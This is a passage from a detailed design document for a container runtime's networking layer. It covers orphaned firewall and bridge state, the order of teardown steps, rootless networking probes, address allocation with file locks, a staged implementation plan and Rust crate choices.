| the network namespace | **only if nothing pins it** | last process exit / last fd close / **umount of the bind mount** | *the* leak: pins veths, ifindexes, sysctls and nft tables forever |
| nsfs bind mount | **no** | `umount2()` + `unlink()`, by us | pins the namespace above |
| the bridge | **no** | `RTM_DELLINK`, by us | a permanently-UP device holding an address and an on-link route |
| the bridge's address + connected route | **no** | dies with the bridge | burns a subnet from our pool |
| `nat/POSTROUTING` MASQUERADE for the subnet | **no** | rule delete, by us | masquerades a subnet nobody owns |
| `raw/PREROUTING` anti-spoof rule per container IP | **no** | rule delete, by us | blackholes traffic to an address that may be reassigned |
| DNAT + filter ACCEPT per published port | **no** | rule delete, by us | **security-relevant**: a port open to a container that no longer exists |
| IPAM allocation | depends entirely where we put it | §11.9 | pool exhaustion, or worse, double allocation |
| userland proxy helper | **no** — reparented to pid 1 | kill, by us | holds a host port hostage; `EADDRINUSE` forever |
| `net.ipv4.ip_forward = 1` | **no** | never; must not be blind-reverted | the host is now a router |
| `filter/FORWARD` policy DROP | **no** | never | can break the admin's own routing |
| **conntrack entries** | **no** | timeout, or explicit flush | silently defeats *correct* rules — see below |
| **packaging-installed host config** (`modules-load.d`, `sysctl.d`, units) | **no — it outlives the uninstall** | a human reading a drop-in nobody remembers | global packet-processing change for software unrelated to us |

**Recommendation.** Two conclusions drive the code. (1) **veth needs no cleanup code at all.**
(2) **Every remaining row is something we wrote and only we can unwrite** — so our teardown path is
not a nicety, it is the only garbage collector on the host, and a teardown that only runs on the
happy path is not a garbage collector, it is a hope.

#### The two kinds of state, and why only one self-heals

**Fact.** The split that actually predicts what leaks is **not** filter-versus-nat and **not**
create-time-versus-start-time. It is **chains we own versus chains we share**:

> Rules written into **our own** chains are flushed and rebuilt at startup, so orphans there
> self-heal. Rules written into **built-in** chains shared with other software — `nat/POSTROUTING`,
> `raw/PREROUTING`, the jumps in `filter/FORWARD` — cannot be flushed. They can only be deleted by
> exact match reconstructed from a record, so once the record is gone they are **permanent**. The
> device, its address and its route are in the same category: nothing can enumerate them as "ours"
> without the record.

**Fact — the evidence.** Measured on a live production host, twice, seven weeks apart, unchanged:

```
docker network ls   -> 4 networks; NOTHING owns 172.19.0.0/16 or the id 0d4cf39c58f7
ip -d link show br-0d4cf39c58f7
  26: br-0d4cf39c58f7: <NO-CARRIER,BROADCAST,MULTICAST,UP> state DOWN  fdb_n_learned 0
ip -4 -o addr        -> 26: br-0d4cf39c58f7  inet 172.19.0.1/16
ip route             -> 172.19.0.0/16 dev br-0d4cf39c58f7 ... linkdown
iptables -t nat -S POSTROUTING
  -A POSTROUTING -s 172.19.0.0/16 ! -o br-0d4cf39c58f7 -j MASQUERADE          <-- ORPHAN
iptables -t raw -S
  -A PREROUTING -d 172.19.0.2/32 ! -i br-0d4cf39c58f7 -j DROP                 <-- ORPHAN
  -A PREROUTING -d 172.19.0.3/32 ! -i br-0d4cf39c58f7 -j DROP                 <-- ORPHAN
iptables -t filter -S | grep -E '172\.19|0d4cf39c58f7'   -> (empty)
```

A bridge, administratively UP, holding an address and therefore an on-link route, with zero ports;
no network claiming its subnet; the MASQUERADE and two per-container anti-spoof rules still
installed; **the filter-table rules gone.** The anti-spoof rules are per container IP, so this is
not one leak — it is one leak *per container that ever ran on that network*. The bridge's ifindex is
26 against the live bridge's 67, so it long predates the current configuration. **This host has
never had a networking outage.** This is simply what a naive implementation leaves behind.

The discriminator is visible in the same dump: `nat/DOCKER` contains a per-network
`-i <bridge> -j RETURN` rule for each live bridge and **none for the orphan**. That rule is also
written at network-create time, and it *was* cleaned — because it lives in a chain Docker owns.

**Recommendation — this is the strongest argument for the single-table design, stronger than
atomicity.** With `table inet mydocker` and nothing outside it, **100 % of our firewall state is
enumerable with no record of ours surviving**: `nft list table inet mydocker` is a complete
inventory and `nft delete table inet mydocker` is a complete atomic reset. The
permanent-orphan class **disappears by construction**, not by better bookkeeping.

**Recommendation — and the sting in the tail.** §11.5 may force us to write **exactly one** rule
outside our table: an `accept` into a foreign `filter/FORWARD`. **That one rule is therefore the
only piece of our state that can become a permanent orphan.** It must carry an unmistakable,
greppable marker so a sweep can find and remove it with no record of ours intact, and the reconcile
pass must look for it explicitly. One rule, one marker, one extra line in the sweep.

#### Cleanup ordering: rules before devices

**Recommendation — and it is counter-intuitive enough to deserve a comment in the code.** Delete
every rule naming a subnet or a device **before** deleting the device. **A half-cleanup that removes
the device first is strictly worse than no cleanup at all.**

**Fact — why.** The orphan above is currently *safe* precisely because the bridge still exists: its
address creates an on-link route, and the allocator's on-link-route heuristic therefore never
re-allocates that subnet. An admin who finds it and runs the natural first command —
`ip link delete br-0d4cf39c58f7` — removes the address, removes the route, and makes the subnet
**allocatable again**, while leaving behind:

- `-A POSTROUTING -s 172.19.0.0/16 ! -o br-0d4cf39c58f7 -j MASQUERADE`, whose `! -o` names a device
  that no longer exists, so the exclusion **can never match** ⇒ every packet from the new subnet,
  **including container-to-container traffic on the same new bridge**, gets masqueraded, and every
  container sees every peer as the gateway;
- two `raw/PREROUTING` DROP rules that **silently blackhole** all externally-originated traffic to
  the new `.2` and `.3` — before conntrack, before nat, with no log.

The same ordering governs our own teardown, and it sits alongside the other counter-intuitive
ordering rule from §11.1: **unmount the namespace first**, because that is the operation that
garbage-collects the veths.

#### Conntrack: entries that defeat correct rules

**Fact.** NAT rules are consulted only when a conntrack entry is **created**; every later packet of
a flow is translated from the existing entry without re-traversing the `nat` table. The corollary:
**a conntrack entry created before our rules existed will keep bypassing them for its whole
lifetime.** The failure is a container configured perfectly, with a completely clean ruleset, that
is unreachable or reachable-but-unmasqueraded.

**Convention.** Docker hit this three times and now flushes explicitly, naming both race windows in
its own source comment: a packet received *between userland-proxy startup and rule setup*, and a
packet received when there was *nowhere to route it* (netfilter creates an entry anyway).

**Recommendation.** Flush conntrack for the container's addresses **at the end of setup**, not only
at teardown. Use IP-wide flushes for setup and teardown; for the narrower case of ports changing on
a running container, flush **UDP only** — an obsolete TCP flow gets an RST from its peer and heals
itself, whereas a UDP "flow" will happily keep translating to a dead address until it times out.
The mechanism is `NETLINK_NETFILTER`/ctnetlink `IPCTNL_MSG_CT_DELETE`, a *fourth* netlink family
beyond the three in §11.2. **Cheapest honest MVP: shell out to `conntrack -D -d <ip>`**, treat a
missing binary as a warning rather than a failure, and hand-roll ctnetlink later once we already own
a netlink socket loop.

#### The lifecycle shape

**Recommendation.** Exactly one owner per object, and it is never "the container":

| Object | Owner | Lifetime |
|---|---|---|
| namespace + bind mount, veths, container addresses/routes | the **network sandbox** | refcounted; last detach frees it |
| bridge, subnet, MASQUERADE rule | the **network** | created on first use, freed on explicit network delete only |
| DNAT/filter rules, anti-spoof rule, proxy helper, conntrack flush | the **attachment** (sandbox × network) | strictly inside the sandbox's lifetime |

The container is a *user* of a sandbox, not the owner of one. This is also what makes a pause
container unnecessary: a Kubernetes pause container exists to be a stable process holding the
namespace open so workload containers can come and go, and **the nsfs bind mount already does that
job with zero processes** (§11.1). Model the sandbox as its own entity with its own refcount from
day one; getting it wrong later is a painful refactor and getting it right costs one struct.

**Recommendation.** One setup path, idempotent, and recovery is "run setup again". This is what the
reference implementation does — netavark's `firewall-reload` reads its persisted intent and re-runs
the *same* `setup_network`/`setup_port_forward` calls used for a fresh container; there is no
separate restore path. A second, subtly different restore path is the classic way to build a system
that works on first boot and corrupts itself on recovery.

**Recommendation.** Persist declarative intent as small files, keyed by id, **before** the host
mutation — plus the backend driver's name alongside, so recovery knows which firewall wrote the
rules, plus a single `flock` held across "read intent + apply" and across "remove intent + unapply".
The lock is the non-obvious part and it is a real bug otherwise: without it a reconcile pass can
read the intent files of a container that is being deleted and re-add rules that should not exist.

**Recommendation.** **The record must outlive the host state it describes.** Write the tombstone
*before* the first host mutation of a teardown; delete the record *after* the last host mutation
succeeds. A delete that removes the record first is not optimistic, it is a leak generator — it is
exactly how the orphan above became unreachable, because the record is the only handle on the bridge
name, the subnet and therefore the rules.

Setup, and teardown, written out because the order is the design:

```
Setup (each step idempotent, intent recorded before mutating)
  1. flock the network               5. veth pair, peer directly into the namespace
  2. allocate the address            6. addresses, routes, lo up
  3. write the intent record         7. ONE nft transaction: masq + publish + anti-spoof (ATOMIC)
  4. create namespace + bind mount   8. flush conntrack for the address
                                     9. mark the record ready

Teardown (best-effort, never abort early, collect all errors)
  1. flock; mark the record deleting
  2. umount2(ns, MNT_DETACH) + unlink   <-- FIRST: this garbage-collects both veths
  3. nft transaction removing this attachment's rules (ATOMIC)
  4. kill proxy helpers
  5. flush conntrack for the address
  6. free the IPAM allocation
  7. delete the record                  <-- LAST
```

**Recommendation.** `rm` on a container whose supervisor died mid-setup must not need the
supervisor. Record `ready` ⇒ ordinary teardown. Record `creating` or `deleting` ⇒ **run the ordinary
teardown anyway**, because every step tolerates its object being absent (`ENOENT` from `unlink`,
`EINVAL` from `umount2`, "no such table" from nft, "no such link" from `RTM_DELLINK`, an IPAM
release of an address already free). No record at all but host state matching our naming convention
⇒ the reconcile sweep handles it. **Never return an error merely because something was already
gone** — return an error only when something we still own could not be removed, and then leave the
tombstone so the next attempt retries.

**Fact.** This is what CNI concluded after a decade. Its `DEL` is idempotent *by specification* —
*"Plugins MUST accept multiple DEL calls for the same (CNI_CONTAINERID, CNI_IFNAME) pair, and return
success if the interface in question, or any modifications added, are missing"* — and *"DEL command
invocations are always considered best-effort"*. And it was still **not sufficient**: CNI spec 1.1.0
added a **GC** verb, *"a way for runtimes to specify the expected set of attachments to a network"*
so the plugin can *"remove any stale resources related to attachments that do not exist in this
set"*. Docker's `cleanupLocalEndpoints()` is the same mark-and-sweep algorithm arrived at
independently.
Source: `cni/SPEC.md@v1.1.0`.

**Recommendation.** Build that sweep from the start. It is small: enumerate reality
(`readdir` our namespace directory; an `RTM_GETLINK` dump filtered to our name prefix;
`nft list table inet mydocker`; `readdir` our intent directory; find our helper processes), probe
each namespace bind mount with `open` + `setns` and unlink on `EINVAL`, compute the live set from
the container store, and tear down everything not in it with the ordinary idempotent teardown. None
of those steps needs our own state to be intact.
**Recommendation.** Do **not** sweep the *bridge* on that trigger — a bridge with zero ports is
normal and deleting it because it is momentarily idle breaks the very next `run`. Bridges go on
explicit network delete, but a `network prune` must be able to find them **by our naming convention
even when the record is gone** — which is exactly the recovery the reference implementation cannot
perform, and the orphan above is what that costs.

**Fact.** Interface names are tight: `IFNAMSIZ` is 16 **including** the NUL, so 15 usable
characters. Docker uses all of it (`br-0d4cf39c58f7` = 3 + 12). Pick our prefix once and never
change it, because it is a data format that the reconcile sweep parses.

**Recommendation — what we deliberately do not recover.** If we ever set `ip_forward = 1` or a
`FORWARD` policy of DROP, we must not auto-revert them: we cannot distinguish "we set this" from
"the admin set this", and guessing wrong breaks the host's own routing. Record in our own state that
we made the change, log loudly at the time, and surface it in `info` — but never undo it. (§11.5
recommends never making the `ip_forward` change at all, which removes the dilemma.)

---

### 11.8 Rootless networking

**Fact — the gate, stated correctly.** **There is no such thing as a capability "in a network
namespace": capabilities live in *user* namespaces.** The rule the kernel enforces for every
device-moving rtnetlink message is `rtnl_link_get_net_capable()` →
`netlink_ns_capable(skb, net->user_ns, CAP_NET_ADMIN)`: **`CAP_NET_ADMIN` in the user namespace that
*owns* the target network namespace.** The host namespace is merely the common case of a namespace
owned by `init_user_ns`, where an unprivileged process has nothing.
Source: `v6.11/net/core/rtnetlink.c`; the kernel's own comment on `rtnl_get_net_ns_capable()` reads
*"the caller is required to have CAP_NET_ADMIN in the user namespace owning the target net ns."*
`drivers/net/veth.c` contains **no** capability check at all — the entire decision lives in the
rtnetlink layer, so this is the uniform rule for every device operation, not a veth policy.

**Fact — the probe that settles the framing.** Measured on Rocky 8.8, kernel 4.18, unprivileged:

| Probe | Result |
|---|---|
| host namespace, unprivileged: `ip link add … type dummy` / `type veth` / `ip addr add` | **EPERM** (all three) |
| inside `unshare -Urn`: `ip link set vout netns 1` (the initial namespace) | **EPERM** |
| inside `unshare -Urn`: `ip link set vout netns <a child netns of the SAME userns>` | **rc=0, OK** |
| inside `unshare -Urn`: `ip link set vout netns <a SIBLING `unshare -Urn` of mine>` | **EPERM** |

The sibling is not the host namespace. It is mine, unprivileged, created by my own uid seconds
earlier — and the move still fails. **The wrong framing ("you need CAP_NET_ADMIN in the host
namespace") suggests a rootless engine could attach containers to a bridge it created in some other
namespace it owns. It cannot.** The only namespace a rootless process can push an interface into is
one owned by a user namespace it holds `CAP_NET_ADMIN` in — its own, or a descendant. That is
precisely why `rootlesskit` creates a *single* rootless network namespace owned by the engine's own
user namespace, puts every container's bridge inside *that*, and crosses the host boundary with a
userspace stack rather than a veth.

**Fact — the entire bridge-and-NAT model is constructible rootless, on a kernel as old as 4.18.**
Measured inside `unshare -Urn` (`CapEff: 000001ffffffffff`, `uid_map: 0 <host uid> 1`):

```
bridge add br0                      OK      nft add table ip mynat              OK
veth pair create                    OK      nat/postrouting chain (srcnat)      OK
addr add 10.77.0.1/24 br0           OK      masquerade rule                     OK
enslave v0 to br0 (IFLA_MASTER)     OK      nat/prerouting chain (dstnat)       OK
br0 / v0 / v1 up                    OK      dnat to 10.77.0.2:80 rule           OK
addr add 10.77.0.2/24 v1            OK      filter chain @ priority 0 (DROP)    OK
route add via …                     OK      filter chain @ priority -300 (raw)  OK
dummy device add                    OK      named set (ipv4_addr) + elements    OK
write ip_forward / rp_filter /              set-matching drop rule              OK
  route_localnet /                          nft -f <file> (atomic replace)      OK
  ip_unprivileged_port_start        OK
```

Named sets, set elements, base chains at arbitrary priorities **including raw (−300)**, and
whole-table atomic replacement all work rootless on 4.18. **The nftables design in §11.5 is
therefore not a root-only design we would have to retrofit for rootless.**

**Trap.** *Constructible* is not *reachable*. A rootless namespace with a bridge, an address and a
default route and no helper is a sealed box: measured, `getent hosts example.com` times out and
`/dev/tcp/1.1.1.1/443` returns `No route to host`. **A rootless container's path to the outside
cannot be a veth at all.** It must be a userspace stack or a setuid helper.

**Fact — the helper menu, with what each buys:**

| Helper | What it buys | Availability |
|---|---|---|
| **`pasta`/`passt`** | tap in the namespace, `splice(2)` bypass for local traffic, no NAT, 65520 MTU, copies the host's own addressing into the namespace | **absent on RHEL-family 8.x** (not in base repos) |
| **`slirp4netns`** | usermode TCP/IP stack; tap inside, ordinary sockets outside | present and working on the RHEL 8 probe, v1.2.3 / libslirp 4.4.0 |
| **`lxc-user-nic`** | setuid-root: creates the veth in `init_net` for you | absent on the probe |
| `newuidmap`/`newgidmap` | **not a networking helper at all** — setuid helpers for writing `uid_map`/`gid_map` from `/etc/subuid`; they do not touch netlink and cannot move an interface | binaries present but no `/etc/subuid` entry ⇒ unusable |

**Recommendation.** Shell out; do not write a usermode TCP/IP stack and do not build a setuid
helper. A usermode stack is a multi-month project with a large security surface and it is not what
this project set out to understand; a setuid binary is the one component where our mistake is a
local root exploit. **Probe for both `pasta` and `slirp4netns`, prefer `pasta`, fall back to
`slirp4netns`** — two binaries, not one, because `pasta` is simply absent on RHEL-family 8.x, which
is the degradation case. Both take a pid and a tap name, so the fallback is cheap.

**Fact — a process-topology constraint that does not exist.** A rootless network helper does **not**
have to be launched from inside the container's user namespace. `slirp4netns` ≥ 1.0 satisfies
`netns_install()`'s two-capability check itself: its `nsenter()` opens `/proc/<pid>/ns/user`
automatically when `--userns-path` is absent, calls `setns(usernsfd, CLONE_NEWUSER)` first — which
grants a full capability set in that namespace — and only then `setns(netnsfd, CLONE_NEWNET)`.
Measured end to end from a plain unprivileged login shell in the initial user namespace, with and
without `--userns-path`, on kernel 4.18: tap configured at `10.0.2.100/24`, default route via
`10.0.2.2`, `ping` to the gateway, and a TCP connect to a public address all succeeded. **This
removes a constraint on the runtime's process topology; the daemon may launch the helper directly.**
(§11.1's rule — `setns(userns)` before `setns(netns)` — is what makes it work, and remains
non-negotiable for any helper of our own.)

**Fact.** "Rootless containers cannot use port 80" is wrong as stated.
`net.ipv4.ip_unprivileged_port_start` lives in the **per-namespace** `ipv4_net_table[]`, duplicated
per namespace by `ipv4_net_table_dup()`, and the capability check is per-namespace too
(`net/ipv4/af_inet.c`: `ns_capable(net->user_ns, CAP_NET_BIND_SERVICE)` against
`net->ipv4.sysctl_ip_prot_sock`). Inside a rootless container's namespace — owned by the user
namespace where we are uid 0 — **binding `:80` succeeds with no sysctl change at all.** Measured:
host value 1024 unchanged, bind to `127.0.0.1:80` inside `unshare -Urn` succeeded.
**The only thing that fails is binding a host-side port below 1024 in the initial namespace.**
**Recommendation.** Publish to a host port ≥ 1024 by default. Do not silently write
`ip_unprivileged_port_start = 0` on the host — document it. Do not set `CAP_NET_BIND_SERVICE` as a
file capability on a helper binary; `passt`'s own documentation advises against it because the
helper then becomes a vector for using that capability from another process.

**Trap.** `ping_group_range` is per-namespace but it is **not** free rootless. Measured on kernel
4.18 inside `unshare -Urn` with a single-gid map: writes of `0 2147483647`, `0 65534` and
`65534 65534` all returned **`EINVAL`**; only `0 0` succeeded. The mechanism is
`net/ipv4/sysctl_net_ipv4.c::ipv4_ping_group_range()`, which does `make_kgid(current_user_ns(), …)`
on both bounds and rejects anything not mappable in the caller's user namespace.
**Recommendation.** Rootful: set it, it is free. **Rootless: attempt it, accept `EINVAL`, and never
treat it as a setup failure.** (It is largely moot for our own rootless containers anyway: `ping`
succeeded regardless, because `ns_capable(net->user_ns, CAP_NET_RAW)` holds for userns-root and
`ping` falls back to `SOCK_RAW`. It matters only for a container that has dropped `CAP_NET_RAW`.)

**Fact — the performance shape, from published CI figures.** At a realistic 1500-byte MTU, kernel
veth is roughly **30×** usermode networking (≈49 Gbps versus ≈1.7 Gbps); usermode only closes to
1.5–6× by using a 64 K MTU, which exists on the internal tap link and not on the real path to the
internet. `pasta`'s `splice(2)` local bypass changes that picture completely where it applies —
64–71 Gbps namespace↔host, *at or above* kernel veth — because for local traffic it does not run an
IP stack at all. Port forwarding through a userspace **L4 proxy** (≈29 Gbps) beats forwarding
through a usermode **IP stack** (≈7.6 Gbps) by about 4×, at the cost of source-IP fidelity.
**Recommendation.** For rootless port publishing, implement the accept-and-relay proxy ourselves
rather than depending on an external port driver: it is the same ~100-line accept/connect/copy loop
§11.4 already needs for the loopback and IPv6 cases. Skip `IP_TRANSPARENT` source-IP preservation
initially; add it when someone needs real client addresses, and **only for TCP** — there is no
`udp_fwmark_accept`, so enabling it for UDP breaks UDP forwarding entirely.

---

### 11.9 IPAM

Two allocation problems get conflated and they have different adversaries. **Pool allocation** —
picking a subnet for a network, once — is adversarial against the *host's own* routing table and the
user's VPN. **Address allocation** — picking an address inside that subnet, per container — is
adversarial against our own concurrency.

**Fact — the constraint that rules out the clever answers.** The kernel cannot arbitrate address
allocation for us. There is no "give me a free address from this subnet" syscall. The kernel learns
of an address only when we `RTM_NEWADDR` it, and we do that **inside the container's namespace**,
where the address is invisible to every other namespace — so a duplicate assignment succeeds
silently on both sides and produces two containers with the same address on one bridge. There is no
`EEXIST` to catch. **The collision is undetectable after the fact and must be prevented before it.**

**Recommendation.** `flock` on the network's directory, held across the whole allocate-and-record
transaction, with **the container record as the source of truth** and an `O_EXCL` per-address claim
file as a lock-free backstop:

```
open("/run/mydocker/net/<netid>/lock", O_CREAT|O_RDWR, 0600); flock(fd, LOCK_EX)
  scan .../addrs/                  -> the taken set
  pick the next free after the recorded cursor      (round-robin, not lowest-free)
  open(".../addrs/172.18.0.4", O_WRONLY|O_CREAT|O_EXCL, 0600); write(container-id)
  write the container record (address included)     <-- the truth
  update .../cursor
```

Four reasons: `flock` is one syscall and is **released automatically on process death including
`SIGKILL`**, which is exactly the failure mode §11.7 is about and the property no hand-rolled
lockfile has; `O_EXCL` gives a claim that is atomic even against a future version of ourselves that
forgets the lock; the claim file is self-describing so the reconcile sweep can rebuild the taken-set
with no dependence on our container store; and it works identically with or without a daemon, so it
does not have to be rewritten later. Round-robin rather than lowest-free is one extra small file and
it buys real robustness — a just-released address does not come straight back into service with
stale neighbour entries on the bridge, stale peer `/etc/hosts` lines and lingering conntrack
pointing at it.
**Known ceiling:** `flock` is advisory and per-open-file-description, so it does not protect against
a process that does not participate; and it serialises container starts on one network, which will
be the throughput ceiling if we ever start hundreds at once. Shard by address range if that ever
matters.

**Recommendation — reject the tempting alternative explicitly.** Deriving the address from a hash of
the container id fails on four counts, any one disqualifying: **birthday collisions** — a /24 has
253 usable addresses, so the expected first collision is around 19 containers, which is routine, not
an edge case; there is **no release**, so a colliding pair can never be separated; it cannot honour
reservations (network, broadcast, gateway, a user's `--ip`), so it needs a fallback path, and the
fallback needs a lock, and we are back where we started; and unpredictable addresses make
`/etc/hosts` snapshots and debugging worse. The one defensible use of a hash is choosing the
**host-side veth name**, where a collision is detectable as `EEXIST` on `RTM_NEWLINK` and
recoverable by retrying. Also reject probe-then-claim (ARP or ping the candidate): it cannot
distinguish "free" from "allocated but not started yet", which is precisely the window two
concurrent starts are in, and it costs a timeout per candidate.

**Recommendation — IPAM is an index, not a database.** The authoritative record of who holds an
address is the **container record**; the allocator is a derived acceleration structure answering
"what is free", rebuilt by replay at startup. This is also what the reference implementation does:
its allocator is pure in-memory state behind a mutex, not persisted, and it declares
`Capability{RequiresRequestReplay: true}` so the controller re-runs the pool request and each
endpoint's address request at daemon start. The reason is decisive: with two stores you have a
two-phase commit and therefore a window where they disagree, and every crash in that window produces
either a leaked address or — far worse — an address allocated twice. With one store there is no
window. **The one thing not to choose is "the allocation bitmap is the truth and the container
record is a copy."**

**Convention.** Default pools, in allocation order: `172.17.0.0/16`, `172.18.0.0/16`,
`172.19.0.0/16`, then `172.20.0.0/14`–`172.28.0.0/14` chopped into /16s, then `192.168.0.0/16`
chopped into **/20s** — 15 × /16 plus 16 × /20, strictly first-fit. Measured: the production host's
allocation history reads straight off that list. IPAM reserves exactly two addresses per pool, the
network and the broadcast address (with the RFC 3021 /31 exception), and **the gateway is not
special-cased** — it is `.1` only because the bridge driver is the first thing to request an address
from a fresh pool.
**Recommendation.** Do the same rather than hardcoding `.1`: `--gateway` then works for free and
unusual subnets need no special case. Record the gateway on the network's record rather than
recomputing it, since it depends on allocation order.

**Fact — conflict with host subnets.** A pool must be excluded if the host already has an on-link
route covering it or a nameserver inside it. The on-link-route heuristic is also what makes the
orphan of §11.7 *safe*: the dead bridge's address creates a route, so its subnet is never
re-allocated — which is exactly why deleting that bridge before its rules is so dangerous.

**Convention, measured across a restart.** Container **addresses are sticky** — ids and namespace
mounts changed while addresses did not — and **MACs are freshly randomised** on each start.
**Recommendation.** Mirror both. Sticky addressing is nearly free once the container record is the
source of truth (pass the recorded address as a *preferred* address on restart; fall back to a fresh
allocation if taken) and it is what makes §11.6's `/etc/hosts` injection survivable. Letting the
kernel generate the MAC matters for a non-obvious reason: **if the MAC is a function of the address,
reusing an address reuses the MAC**, so the bridge FDB and every peer's ARP cache hold entries that
are still syntactically valid but point at the wrong port for up to `ageing_time` (300 s, measured).
That failure is intermittent, direction-dependent and self-healing after five minutes — the worst
diagnostic profile there is. A random MAC on a reused address produces a clean ARP miss and
immediate re-resolution.
**Known ceiling:** sticky addresses mean stopped containers quietly consume the pool. Make that
visible in `info` rather than surprising.

**Never:** IPv6 IPAM before dual-stack work; a pluggable IPAM driver interface (one implementation,
no second caller); DHCP.

---

### 11.10 The networking ladder

Each rung is shippable and each rung's success test must be satisfiable **with only that rung's
work**. Two of the obvious orderings fail that test and are corrected below.

| # | Stage | What the user gets | Host state created | Success test |
|---|---|---|---|---|
| 1 | share the host namespace (`--network=host`) | nothing isolated; a working container in every other dimension | **none** | `run alpine wget -qO- example.com` succeeds; `ip addr` inside == host's |
| 2 | new namespace, `lo` up (`--network=none`) | isolation; a private port space | one nsfs bind mount | `nc -l 127.0.0.1:8080` inside works; host `ss -ltn` does not show it |
| 3 | veth to host, manual routes | container↔host only. **A detour** | + one host veth, one host route, one host address | container pings the host's veth address and back |
| 4 | + bridge + NAT **+ `resolv.conf`/`hosts` generation** | **the internet.** The first genuinely useful rung | + a bridge, a subnet, a MASQUERADE rule | **two containers ping each other by address**, and `apk add curl` succeeds |
| 5 | + published ports **+ the loopback helper** | inbound; the container is a *service* | + 3 nat rules and 1 filter ACCEPT **per published port**, 1 anti-spoof rule **per container address**, ± a helper per port | `curl <host-ip>:8080` from the host **and** from another machine; unpublished ports refused |
| 6 | + peer-name resolution | names instead of addresses | + per-namespace resolver sockets and rules | a container resolves a peer by name |

**Corrected ordering, 1 — stage 4 cannot be tested without DNS.** `apk add curl` needs a nameserver,
and a container at stage 4 has an address, a route, working MASQUERADE and **no nameserver at all**.
The ~30-line `resolv.conf`-and-`/etc/hosts` generation of §11.6 is therefore a **prerequisite** of
stage 4, not a successor, and it is folded into the stage above. The criterion that gates the stage
on its own is *two containers ping each other by address*. Without this fix, stage 4 *looks* broken:
addresses work, names do not, and every user diagnoses it as "networking is broken".

**Corrected ordering, 2 — stage 5 cannot be tested with `curl localhost:8080`.** Loopback is
**deliberately excluded from DNAT** by `! -d 127.0.0.0/8` in `nat/OUTPUT` (§11.4), so the only
things that can serve it are a userland helper bound to the loopback address or `route_localnet=1`,
which we refuse. Either the helper moves into stage 5's definition — it is the same ~100 lines
stage 5 needs for IPv6 anyway — or the test becomes `curl <host-ip>:8080`, which exercises the
`nat/OUTPUT` path and is satisfiable with rules alone. The table above takes the first option.

**Everything else in the ordering is sound.** Stage 3 genuinely does not need `ip_forward`
(container↔host over a veth is local delivery, not forwarding) and genuinely does not need IPAM
(hardcode the pair). Stage 5 genuinely needs stage 4's bridge. Stage 2 needs only `lo` up, which it
includes.

**Recommendation.** Build stage 1 first — but **it must stop being the default the moment stage 2
exists.** `--network=host` is the correct first rung because it is the *absence* of networking work
and the presence of a great deal of non-networking value: it proves out rootfs, exec, cgroups,
signals and wait with networking removed as a variable, it is the debugging vehicle for stages 2–6,
and it is the same code path `--network=container:X` and pod-sharing reduce to. It is also a
documented security anti-pattern — a container sharing the host namespace reaches every host-local
service, including anything trusting `127.0.0.1` and cloud metadata at `169.254.169.254` — and the
honest prediction is that users will park on it. **So: ship it first, make `--network=none` the
default the day it exists, and require an explicit flag plus a one-line warning for host mode.**
Defaults are the hardest thing to change later.

**Recommendation.** Do stage 3 as an afternoon's experiment, not as a shipped mode. What "veth to
host with manual routing" actually costs: a host-side address to be the next hop (a /30, or a /32
plus an on-link route); **a host route per container**, because with no bridge there is no shared
segment so nothing is learned; `proxy_arp` on the host veth or a link-scoped route inside the
container so the container's ARP resolves at all; and **O(n²) host routes** for any
container-to-container path. Stage 4 replaces all of that with one bridge, one `IFLA_MASTER`, and
one kernel-generated connected route. **The bridge is not an optimisation over manual routing; it is
less work than manual routing**, because the kernel's FDB does the per-container bookkeeping we
would otherwise do by hand in the routing table. That is the real reason every container engine uses
a bridge, and it is not obvious until stage 3 has been priced. The learning value is high and
specific — it is where you discover that `ifi_change` matters, that a veth is `LOWERLAYERDOWN` until
its peer is up, and that `RTM_NEWROUTE` needs the address to exist first. Do it once, from netlink,
by hand, then delete it.

**Recommendation — the risk profile differs by rung and the mitigations are not interchangeable.**
Stage 4 carries the **largest irreversible global mutation**: a bridge holding an address and an
on-link route, which permanently reserves a subnet as far as any future allocator is concerned and
which is the exact object observed leaked in production. (If we follow §11.5 and refuse rather than
write `ip_forward`, that mutation leaves the list entirely, which materially shrinks stage 4's
risk.) Stage 5 carries the **highest rate** of mutation and is the only rung where partial state is
a **security hole**: a published port is several coordinated rules plus possibly a helper, mutated
on every container start *and* stop, and the partial states are asymmetric — DNAT without the filter
ACCEPT merely fails, whereas **filter ACCEPT without the `raw` anti-spoof rule opens the pre-28
hole** to anyone who can route to the container's address. So stage 4 needs the loudest logging and
the most conservative defaults, and **stage 5 must not begin before the atomic nft transaction path
works.** Implementing stage 5 on rule-at-a-time iptables means shipping a known security hole with a
crash as its trigger.

**Recommendation — build networking in, not as an OCI hook, but keep CNI's shape.** The hook
boundary looks attractive and fails on lifecycle: **`poststop` only runs if someone calls `delete`**
(the spec's wording is *"after the container is deleted but before the delete operation returns"*),
so if our supervisor is `SIGKILL`ed the hook contract has no answer at all. It also makes the sweep
*harder*, because a hook process can enumerate host reality but has no idea what is alive; it
degrades typed errno handling into an exit code and English on stderr, which is exactly what
idempotent resumable setup depends on; and §11.1's socket trick does not survive it, since a hook
process exits and whatever socket it created dies with it. Keep the **five CNI verbs** as an
internal trait — `ADD` / `DEL` / `CHECK` / `GC` / `STATUS` — because those five are independently
exactly the operations §11.7 concluded we need, and keep the *runtime core* free of all of it: the
core creates and joins namespaces per the OCI `namespaces` array and does nothing else
network-shaped. That keeps a future runtime binary honestly OCI-compatible and makes real CNI plugin
compatibility a wrapper rather than a rewrite.

---

### 11.11 Crates

Judged on one criterion: **does it hide the mechanism we are trying to learn?** Not popularity.

| Crate | What it hides | Verdict |
|---|---|---|
| `netlink-sys` 0.9 | `socket()`/`bind()`/`sendto()` plus `setsockopt` | **take.** Hides nothing we care about, and it is what exposes `NETLINK_GET_STRICT_CHK`. Its only non-optional dependencies are `bytes`, `libc` and `log`; every async backend is optional |
| `netlink-packet-core` 0.9 | nothing — it *is* `nlmsghdr` in Rust types | **take** (it arrives with the route crate anyway) |
| `netlink-packet-route` 0.33 | **the TLV byte layout** — ~47 k lines of attribute tedium | **take.** This is the one thing worth hiding. Read `link_info/veth.rs` once to see the embedded-`ifinfomsg` trick, then use the crate. Pure encode/decode, no I/O at all |
| `netlink-proto` 0.13 | sequencing and demultiplexing | **avoid** — that is what we want to own |
| `rtnetlink` 0.23 | message construction **and the executor choice** | **avoid**, and the second half is the real objection |
| `nix` | thin typed syscall wrappers | takes `sched::{unshare,setns}`, `mount::{mount,umount2}`, `fcntl::Flock` off our plate. Covers every syscall in §11.1 and §11.7 and **none** of §11.2 — which is why the answer is "`nix` *and* the packet crates", not one or the other |
